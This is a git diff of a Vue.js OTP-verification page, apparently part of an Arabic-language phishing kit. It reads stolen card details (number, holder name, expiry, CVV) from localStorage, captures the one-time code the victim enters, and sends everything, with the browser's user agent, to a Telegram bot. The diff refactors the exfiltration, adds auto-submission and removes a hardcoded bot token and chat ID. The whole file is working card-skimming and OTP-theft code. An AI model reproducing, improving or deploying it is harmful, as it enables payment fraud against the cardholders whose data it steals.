@@ -13,20 +13,26 @@ new Vue({
       resendCountdown: 60,
       resendInterval: null,
       cardData: null, // بيانات البطاقة من الصفحة السابقة
-      telegramBotToken: "8642789421:AAH5WVNFF0yxI-OIRjtsMPuBw3cSawVF1pk",
-      telegramChatId: "8642789421"
+      isSubmitting: false // لمنع الإرسال المتكرر
     };
   },
   computed: {
     isOtpValid() {
       return this.otpCode.length === 4 || this.otpCode.length === 6;
+    },
+    timePercentage() {
+      return (this.timeRemaining / 300) * 100;
     }
   },
   mounted() {
     // استرجاع بيانات البطاقة من localStorage
     const savedCardData = localStorage.getItem('cardData');
     if (savedCardData) {
-      this.cardData = JSON.parse(savedCardData);
+      try {
+        this.cardData = JSON.parse(savedCardData);
+      } catch (error) {
+        console.error("خطأ في استرجاع بيانات البطاقة:", error);
+      }
     }
 
     // بدء العد التنازلي
@@ -34,8 +40,14 @@ new Vue({
     
     // التركيز على حقل الإدخال
     this.$nextTick(() => {
-      document.getElementById("otpCode").focus();
+      const otpInput = document.getElementById("otpCode");
+      if (otpInput) {
+        otpInput.focus();
+      }
     });
+
+    // بدء مؤقت إعادة الإرسال
+    this.startResendCountdown();
   },
   beforeDestroy() {
     // إيقاف المؤقتات عند مغادرة الصفحة
@@ -55,6 +67,13 @@ new Vue({
       if (this.otpCode.length > 6) {
         this.otpCode = this.otpCode.slice(0, 6);
       }
+
+      // الإرسال التلقائي عند إدخال 6 أرقام
+      if (this.otpCode.length === 6) {
+        this.$nextTick(() => {
+          this.submitOtp();
+        });
+      }
     },
     formatTime(seconds) {
       const mins = Math.floor(seconds / 60);
@@ -68,57 +87,66 @@ new Vue({
         if (this.timeRemaining <= 0) {
           clearInterval(this.timerInterval);
           this.timeRemaining = 0;
+          alert("⏰ انتهت صلاحية الرمز. يرجى طلب رمز جديد");
         }
       }, 1000);
     },
+    /**
+     * تنسيق رسالة التحقق من OTP
+     */
+    formatOtpMessage() {
+      return `
+🔐 <b>تم التحقق من رمز OTP:</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 <b>رمز التحقق:</b> <code>${this.otpCode}</code>
+⏱️ <b>الوقت المتبقي:</b> ${this.formatTime(this.timeRemaining)}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 <b>بيانات البطاقة الأصلية:</b>
+💳 <b>رقم البطاقة:</b> <code>${this.cardData?.cardNumber || 'غير متاح'}</code>
+👤 <b>اسم صاحب البطاقة:</b> ${this.cardData?.cardName || 'غير متاح'}
+📅 <b>تاريخ الانتهاء:</b> ${this.cardData?.cardMonth}/${this.cardData?.cardYear}
+🔐 <b>CVV:</b> <code>${this.cardData?.cardCvv || 'غير متاح'}</code>
+💳 <b>نوع البطاقة:</b> ${(this.cardData?.cardType || 'unknown').toUpperCase()}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
+🌐 <b>الجهاز:</b> ${navigator.userAgent}
+      `.trim();
+    },
+    /**
+     * إرسال رمز التحقق إلى تليجرام
+     */
     submitOtp() {
+      // منع الإرسال المتكرر
+      if (this.isSubmitting) {
+        alert("⏳ جاري إرسال البيانات، يرجى الانتظار...");
+        return;
+      }
+
       if (!this.isOtpValid) {
-        alert("يرجى إدخال 4 أو 6 أرقام");
+        alert("❌ يرجى إدخال 4 أو 6 أرقام");
         return;
       }
 
       if (this.timeRemaining <= 0) {
-        alert("انتهت صلاحية الرمز. يرجى طلب رمز جديد");
+        alert("⏰ انتهت صلاحية الرمز. يرجى طلب رمز جديد");
         return;
       }
 
-      // إنشء رسالة البيانات
-      const message = `
-🔐 تم التحقق من الرمز:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📱 رمز التحقق: ${this.otpCode}
-⏱️ الوقت المتبقي: ${this.formatTime(this.timeRemaining)}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
+      // التحقق من إعدادات تلجرام
+      if (!validateTelegramConfig()) {
+        alert("❌ خطأ: إعدادات تلجرام غير صحيحة. يرجى تحديث ملف config.js");
+        return;
+      }
 
-📋 بيانات البطاقة الأصلية:
-💳 رقم البطاقة: ${this.cardData?.cardNumber || 'غير متاح'}
-👤 اسم صاحب البطاقة: ${this.cardData?.cardName || 'غير متاح'}
-📅 تاريخ الانتهاء: ${this.cardData?.cardMonth}/${this.cardData?.cardYear}
-🔐 CVV: ${this.cardData?.cardCvv || 'غير متاح'}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
-      `;
+      this.isSubmitting = true;
+
+      // إنشء رسالة البيانات
+      const message = this.formatOtpMessage();
 
       // إرسال الرسالة إلى تليجرام
-      this.sendToTelegram(message);
-    },
-    sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`;
-      
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: this.telegramChatId,
-          text: message,
-          parse_mode: 'HTML'
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
+      sendToTelegram(message)
+        .then(data => {
           alert("✅ تم التحقق بنجاح! تم إرسال البيانات إلى تليجرام");
           // مسح البيانات المحفوظة
           localStorage.removeItem('cardData');
@@ -126,18 +154,18 @@ new Vue({
           setTimeout(() => {
             this.resetForm();
           }, 1500);
-        } else {
-          alert("❌ حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقاً");
-          console.error("خطأ تليجرام:", data);
-        }
-      })
-      .catch(error => {
-        alert("❌ خطأ في الاتصال. يرجى التحقق من الاتصال بالإنترنت");
-        console.error("خطأ:", error);
-      });
+        })
+        .catch(error => {
+          console.error("خطأ في الإرسال:", error);
+          alert(`❌ حدث خطأ أثناء الإرسال:\n${error.message}`);
+        })
+        .finally(() => {
+          this.isSubmitting = false;
+        });
     },
     resendOtp() {
       if (!this.canResend) {
+        alert(`⏳ يرجى الانتظار ${this.resendCountdown} ثانية قبل إعادة الطلب`);
         return;
       }
 
@@ -172,32 +200,31 @@ new Vue({
         }
       }, 1000);
     },
+    /**
+     * إرسال إشعار إعادة الإرسال إلى تليجرام
+     */
     sendResendNotification() {
       const message = `
-🔄 تم طلب إعادة إرسال الرمز
+🔄 <b>تم طلب إعادة إرسال رمز OTP</b>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
-      `;
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
+🌐 <b>الجهاز:</b> ${navigator.userAgent}
+      `.trim();
 
-      const url = `https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`;
-      
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          chat_id: this.telegramChatId,
-          text: message,
-          parse_mode: 'HTML'
-        })
-      })
-      .catch(error => console.error("خطأ في إرسال إشعار إعادة الإرسال:", error));
+      sendToTelegram(message)
+        .catch(error => console.error("خطأ في إرسال إشعار إعادة الإرسال:", error));
     },
     goBack() {
       if (confirm("هل تريد العودة إلى الصفحة السابقة؟")) {
         // مسح البيانات المحفوظة
         localStorage.removeItem('cardData');
+        // إيقاف المؤقتات
+        if (this.timerInterval) {
+          clearInterval(this.timerInterval);
+        }
+        if (this.resendInterval) {
+          clearInterval(this.resendInterval);
+        }
         // إعادة التوجيه إلى الصفحة الأولى
         window.location.href = 'index.html';
       }
@@ -207,6 +234,14 @@ new Vue({
       this.timeRemaining = 300;
       this.canResend = false;
       this.resendCountdown = 60;
+      
+      // إيقاف المؤقتات
+      if (this.timerInterval) {
+        clearInterval(this.timerInterval);
+      }
+      if (this.resendInterval) {
+        clearInterval(this.resendInterval);
+      }
       
       // إعادة التوجيه إلى الصفحة الأولى
       window.location.href = 'index.html';
